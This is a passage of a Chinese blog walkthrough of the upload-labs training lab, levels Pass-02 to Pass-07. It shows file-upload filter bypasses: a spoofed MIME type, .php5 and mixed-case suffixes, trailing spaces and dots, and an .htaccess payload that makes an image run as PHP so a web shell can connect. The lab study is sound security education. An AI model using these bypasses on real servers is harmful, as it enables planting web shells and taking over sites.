class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onsubmit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;return checkFile()&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;请选择要上传的图片：&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;input_file&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;upload_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;button&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;上传&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_20-18-32.7zqmw43lx8.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-02&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-02&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-02&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 提示“文件类型不正确，请重新上传”，判断为 &lt;strong&gt;白名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_23-01-47.8vn4bq7eb0.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;尝试 &lt;code&gt;MIME&lt;/code&gt; 绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MIME (Multipurpose Internet Mail Extensions) 多用途互联网邮件扩展是一种标准，用来表示文档、文件或一组数据的性质和格式。&lt;/p&gt;
&lt;p&gt;通用结构：&lt;code&gt;type/subtype&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;类型&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;描述&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;text&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;普通文本&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;text/plain&lt;/code&gt;, &lt;code&gt;text/html&lt;/code&gt;, &lt;code&gt;text/css&lt;/code&gt;, &lt;code&gt;text/javascript&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;image&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;图像&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;image/gif&lt;/code&gt;, &lt;code&gt;image/png&lt;/code&gt;, &lt;code&gt;image/jpeg&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;application&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;二进制数据&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;application/x-httpd-php&lt;/code&gt;, &lt;code&gt;application/octet-stream&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;上传 &lt;code&gt;fish.php&lt;/code&gt;，劫持请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-43-52.3d4zwkrufq.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;将 &lt;code&gt;Content-Type&lt;/code&gt; 从 &lt;code&gt;application/octet-stream&lt;/code&gt; 修改为 &lt;code&gt;image/jpeg&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-47-15.969y5vjei5.webp&#34; alt=&#34;PixPin_2025-04-29_15-47-15&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-52-20.8hgolv2k6w.webp&#34; alt=&#34;PixPin_2025-04-29_15-52-20&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-03&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-03&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-03&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;尝试上传特殊可解析后缀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将 &lt;code&gt;fish.php&lt;/code&gt; 的后缀名修改为 &lt;code&gt;.php5&lt;/code&gt; 进行上传，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-30-42.3goluegrq7.webp&#34; alt=&#34;PixPin_2025-04-29_17-30-42&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;

  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;这里使用蚁剑进行连接出现连接失败，经过多次尝试发现这里需要 &lt;code&gt;php-5.4.45&lt;/code&gt; 的环境，并且需要将 Apache 配置文件 &lt;code&gt;httpd-conf&lt;/code&gt; 的 &lt;code&gt;403&lt;/code&gt; 行 &lt;code&gt;#AddType application/x-httpd-php .php .phtml&lt;/code&gt; 修改为 &lt;code&gt;AddType application/x-httpd-php .php .phtml .php1 .php2 .php3 .php4 .php5 .pht&lt;/code&gt;，使服务器可以正常将这些后缀名的文件解析为 &lt;code&gt;php&lt;/code&gt;。&lt;/p&gt;&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;Pass-04&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-04&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-04&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传特殊可解析后缀 &lt;code&gt;fish.php5&lt;/code&gt; 提示“此文件不允许上传”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-49-51.8z6qakaxdl.webp&#34; alt=&#34;PixPin_2025-04-29_17-49-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;尝试上传 &lt;code&gt;.htaccess&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前面 &lt;code&gt;fish.jpg&lt;/code&gt; 上传成功，但访问时服务器会将它解析为一个图片，提示“图像因存在错误而无法显示”&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.htaccess&lt;/code&gt; 是一个配置文件，用于 Apache 服务器的目录级配置，它允许为特定的目录或文件定义服务器配置，而不需要修改 Apache 的主配置文件。&lt;/p&gt;
&lt;p&gt;新建 &lt;code&gt;.htaccess&lt;/code&gt; 文件并添加以下内容，使服务器可以将 &lt;code&gt;fish.jpg&lt;/code&gt; 解析为 &lt;code&gt;php&lt;/code&gt; 文件&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;.htaccess&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;FilesMatch &amp;#34;fish.jpg&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SetHandler application/x-httpd-php
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;上传 &lt;code&gt;.htaccess&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-59-07.2yyk5udqav.webp&#34; alt=&#34;PixPin_2025-04-29_17-59-07&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;

  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;若上传 &lt;code&gt;.htaccess&lt;/code&gt; 文件后仍然无法将 &lt;code&gt;fish.jpg&lt;/code&gt; 解析为 &lt;code&gt;php&lt;/code&gt; 文件，检查 Apache 的配置文件 &lt;code&gt;httpd-conf&lt;/code&gt;，修改 &lt;code&gt;AllowOverride&lt;/code&gt; 为 &lt;code&gt;All&lt;/code&gt;，允许 &lt;code&gt;.htaccess&lt;/code&gt; 文件在其目录下进行任意的配置覆盖&lt;/p&gt;&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DocumentRoot  &amp;#34;C:\phpStudy\WWW&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;Directory /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Options +Indexes +FollowSymLinks +ExecCGI
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    AllowOverride All
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Order allow,deny
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Allow from all
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Require all granted
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;访问 &lt;code&gt;fish.jpg&lt;/code&gt; 不再提示“图像因存在错误而无法显示”，使用蚁剑成功连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_18-00-48.6bha07w2o2.webp&#34; alt=&#34;PixPin_2025-04-29_18-00-48&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-05&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-05&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-05&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传特殊可解析后缀 &lt;code&gt;fish.php5&lt;/code&gt; 提示“此文件不允许上传”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-49-51.8z6qakaxdl.webp&#34; alt=&#34;PixPin_2025-04-29_17-49-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传 &lt;code&gt;.htaccess&lt;/code&gt; 提示“此文件类型不允许上传”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_18-58-34.4n7x33837l.webp&#34; alt=&#34;PixPin_2025-04-29_18-58-34&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;尝试 &lt;strong&gt;后缀大小写绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将 &lt;code&gt;fish.php&lt;/code&gt; 的后缀名修改为 &lt;code&gt;.PhP&lt;/code&gt; 进行上传，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_19-02-44.6m43tfiup2.webp&#34; alt=&#34;PixPin_2025-04-29_19-02-44&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-06&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-06&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-06&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;尝试 &lt;strong&gt;空格绕过&lt;/strong&gt;，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-08_20-21-37.2h8iu9eio3.webp&#34; alt=&#34;PixPin_2025-05-08_20-21-37&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-07&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-07&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-07&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;尝试 &lt;strong&gt;点绕过&lt;/strong&gt;，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-08_20-28-19.51ed6wnhtq.webp&#34; alt=&#34;PixPin_2025-05-08_20-28-19&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
